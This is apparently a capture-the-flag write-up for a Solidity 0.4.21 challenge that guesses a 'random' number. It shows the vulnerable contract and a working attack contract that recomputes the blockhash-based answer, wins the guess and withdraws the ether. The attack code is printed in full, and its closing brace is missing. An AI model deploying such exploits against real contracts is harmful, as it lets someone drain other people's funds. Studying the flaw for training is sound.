# Catch the Ether 4: Guess the NEW number

Random numbers cannot be created inside solidity, oracles are suggested

## The Task Intro

The number is now generated on-demand when a guess is made.

## The Task Code

```apache
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

## The Solution

The subtile difference to the task before is, that the "random" or "secret" number now is calculated in a function and not in the constructor. This time it is not possible to look anything up from etherscan, this must be done in code, I chose a smart contract. So I precalculated the secret first in my attack contract, then sent the guess to the contract. Call the eth back from the payback function. Important was the receive function, which was called in solidity version 0.4.21 just function() - that was the most research I needed to do for this challenge.

Done 🎉️.

```apache
contract Crack {
    GuessTheNewNumberChallenge gtnnc;

    function Crack(GuessTheNewNumberChallenge _gtnnc) public payable {
        gtnnc = _gtnnc;
    }

    function attack() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        gtnnc.guess.value(msg.value)(answer);
    }

    function payback() public {
        msg.sender.transfer(this.balance);
    }

    function() public payable {}
```
